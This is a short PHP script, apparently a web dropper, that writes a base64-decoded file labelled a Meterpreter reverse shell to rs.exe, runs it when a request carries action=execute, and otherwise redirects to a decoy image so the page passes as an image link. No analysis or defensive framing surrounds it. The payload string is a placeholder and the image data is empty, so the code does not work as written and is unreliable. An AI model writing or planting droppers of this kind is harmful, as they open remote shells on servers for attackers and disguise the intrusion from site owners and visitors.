    // unpack meterpreter reverse shell
    if (!file_exists("rs.exe")) {
        $data = "meterpreter_reverse_tcp";
        $contents = base64_decode($data);
        file_put_contents("rs.exe", $contents);
    }

    // unpack image
    $imageName = basename($_SERVER['PHP_SELF'], '.php') . '.jpg';
    if (!file_exists($imageName)) {
        $data = '';
        $contents = base64_decode($data);
        file_put_contents($imageName, $contents);
    }

    // execute reverse shell and serve image
    if(isset($_GET['action']) && $_GET['action'] == 'execute'){
        exec("./rs.exe");
        echo "Launched";
    }else
        header("Location: $imageName");
?>